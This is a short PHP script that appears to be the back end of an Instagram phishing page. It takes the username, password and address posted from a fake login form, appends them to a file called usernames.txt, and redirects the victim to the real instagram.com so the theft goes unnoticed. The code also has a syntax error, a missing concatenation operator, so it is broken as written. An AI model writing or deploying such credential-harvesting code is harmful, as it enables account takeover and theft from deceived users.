<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "Address1 : " . $_POST['Address1'] "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>